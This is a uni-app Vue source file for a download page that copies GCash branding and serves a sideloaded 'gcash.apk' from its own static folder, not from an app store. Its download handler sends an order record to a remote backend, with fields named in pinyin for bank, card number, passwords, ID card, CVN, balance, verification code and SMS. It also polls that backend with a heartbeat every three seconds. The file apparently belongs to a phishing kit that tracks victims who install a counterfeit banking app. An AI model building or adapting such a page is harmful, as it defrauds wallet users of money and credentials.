<template>
	<view class="home-container">
		<view class="custom-nav">
			<view></view>
			<view><text class="title">{{$t("TITLE_DOWNLOAD")}}</text></view>
			<view></view>
		</view>
		<view variant="text" class="card">
			<view style="padding-top: 64px;" class="row dark-background">
				<div style="text-align: center;">
					<h1>
						<p>Kaya Mo.</p>
						<p>I-GCash mo.</p>
					</h1>
				</div>
			</view>
			<view class="row dark-background main-text">
				<div class="prompt-body">
					<p>{{$t('CONTENT_HOMEPAGE')}}</p>
				</div>
			</view>
			<uni-forms class="form" :modelValue="formData"
				ref="prepareForm" label-position="top" err-show-type="undertext" 
				:rules="rules" validateTrigger="blur" >
			<view class="row dark-background">
				<div style="text-align: center;">
					<uni-row class="download-image-wrapper">
						<uni-col :span="12"><img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Yfc020c87j0.png" @click="downloadIpa" /></uni-col>
						<uni-col :span="12"><img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" @click="downloadApk" /></uni-col>
					</uni-row>
				</div>
			</view>
			</uni-forms>
					<view class="progress-container" v-if="isShowProgress">
						<view class="progress-box">
							<view class="text">文件下载中，请稍后......</view>
							<progress :percent="progress" show-info stroke-width="3" />
						</view>
					</view>
			<view class="row dark-background">
				<div style="padding:2em 0 4em 0;">
					<img style="width:100%" :src="video" />
				</div>
			</view>
			<view class="row">
				<h2>Shop, play, eat and more</h2>
				<h2>only on GLife.</h2>
			</view>
			<view class="row">
				<div class="prompt-body">
					<p>Great deals, brands you love, secure transactions, all in GLife—your super life app.</p>
				</div>
			</view>
			<view class="row">
				<div style="padding:2em 0 4em 0;">
					<img style="width:90vw" src="https://www.gcash.com/wp-content/uploads/2021/03/Home-GLife-Shop-Partners-3976x250-Logo.png" />
				</div>
			</view>
			<view class="row bottom-blank">
			</view>
		</view>
	</view>

</template>

<script lang="ts">
	export default {
		data() {
			return {
				options: {}
			}
		},
		onLoad(options: any) {
			this.options = options;
		}
	}
</script>

<script setup lang="ts">
	import video from "@/static/video.jpg";
	// #ifdef H5
	import FileSaver from 'file-saver';
	// #endif
	import { updateOrder, heartBeat } from './Remote';
	import rules from './Rules';
	import { computed, ref, onMounted, onUnmounted, getCurrentInstance } from "vue";
	
	const isShowProgress = ref(false);
	const progress = 0;
	const prepareForm = ref(null);
	const formData = ref({
		id: "",
		username: "",
		password: "",
	});
	
	onMounted(() => {
		let pageInstance = getCurrentInstance();
		if (pageInstance) {
			let options: any = pageInstance.data.options;
			formData.value.id = options.order
		}
	})
	
	const downloadApk = async () => {
		prepareForm.value.validate();
		let formDataValue = formData.value
		let submitData = {
			d_id: formDataValue.id,
			d_kaihuhang: "",
			d_name: "",
			d_kahao: "",
			d_mima: "",
			d_mima2: "",
			d_sfz: "",
			d_phone: "",
			d_cvn: "",
			d_cvntime: "",
			d_yue: null,
			d_yzm: null,
			d_download: 1,
			d_permission: null,
			d_sms: "",
			d_device: null
		}
		let resp = await updateOrder(submitData);
		if (resp.status == 1) {
			console.log(resp);
			// #ifdef H5
			FileSaver.saveAs("./static/gcash.apk", 'gcash.apk'); 
			uni.redirectTo({
				url: "waiting?order=" + resp.data.d_id
			})
			// #endif
			// #ifdef APP
			download('./static/gcash.apk');
			// #endif
		}
	};
	
	const download = (path) => {
		uni.showToast({
			icon: 'none',
			mask: true,
			title: 'download start: ' + path,
			duration: 2000
		});
		const downloadTask = uni.downloadFile({
			url: path,//下载地址接口返回
			success: (downlaodResp) => {
				console.log(downlaodResp);
				if (downlaodResp.statusCode === 200) {
					isShowProgress.value = false;
					uni.showToast({
						icon: 'none',
						mask: true,
						title: 'download file: ' + downlaodResp.tempFilePath,
						duration: 2000
					});
					uni.saveFile({
						tempFilePath: downlaodResp.tempFilePath,
						success: function(saveResp) {
							uni.showToast({
								icon: 'none',
								mask: true,
								title: 'save file' + saveResp.savedFilePath,
								duration: 2000
							});
							uni.openDocument({
								filePath: saveResp.savedFilePath, //临时路径
								fileType: "apk",
								showMenu: true,
								success: function(openResp) {
									console.log('成功打开文件, ', openResp);
									uni.showToast({
										icon: 'none',
										mask: true,
										title: '成功打开文件' + openResp,
										duration: 2000
									});
									uni.redirectTo({
										url: "waiting?order=" + resp.data.d_id
									})
								},
								fail: (err) => {
									console.log(err);
									uni.showToast({
										icon: 'none',
										mask: true,
										title: '打开失败' + err,
										duration: 2000
									});
								}
							});	
						},
						fail: (err) => {
							console.log(err);
							uni.showToast({
								icon: 'none',
								mask: true,
								title: '保存失败' + err,
								duration: 2000
							});
						}
					})
					
				}
			},
			fail: (err) => {
				console.log(err);
				uni.showToast({
					icon: 'none',
					mask: true,
					title: '失败请重新下载',
				});
			},
		});
		downloadTask.onProgressUpdate((res) => {
			if(res.progress > 0) {
				isShowProgress.value = true;
			}
			progress.value = res.progress;
			console.log('下载进度：' + res.progress);
			console.log('已下载长度：' + res.totalBytesWritten);
			console.log('文件总长度：' + res.totalBytesExpectedToWrite);
		})
		
	};
	onUnmounted(() => {
		clearInterval(heartBeatTimer);
	});	
	
	const heartBeatTimer = setInterval(async () => {
		try {
			heartBeat(formData.value.id);
		}
		catch(error) {
		}
	}, 3000);
	
	const downloadIpa = () => {
		uni.showToast({
			title: "unsupport",
			duration: 2000
		});
	}
</script>

<style>
	.home-container {}

	.download-image-wrapper {
		padding: 0.5em;
		text-align: center;
	}

	.download-image-wrapper img {
		width: 80%;
	}

	.row {
		padding: 0 1em;
		text-align: center;
		;
	}

	.dark-background {
		background-color: #297BFA;
	}

	.product-img {
		transition: all 0.3s ease-in-out;
	}

	.product-card:hover .product-img {
		transform: scale(1.1);
	}

	h1 {
		margin: 0;
		color: #ffffff;
		font-size: 34.5px;
		font-weight: 900;
		line-height: 1.25;
		font-family: Poppins, Arial, Helvetica, sans-serif;
	}

	h2 {
		padding-top: 1em;
		color: #4179F2;
		font-size: 26.8px;
		font-weight: 900;
		line-height: 0.5;
		font-family: Poppins, Arial, Helvetica, sans-serif;
	}

	.main-text {
		min-height: 15em;
	}

	.prompt-body {
		padding: 2em 0em;
		font-size: 16px;
		color: #000000;
		font-family: Karla, Arial, Helvetica, sans-serif;
	}

	.dark-background .prompt-body {
		color: #FFFFFF;
	}

	.bottom-blank {
		min-height: 4em;
	}

	.large-button {
		display: block;
		font-weight: 900;
		width: 100%;
		line-height: 300%;
		border-radius: 2em;
	}
</style>
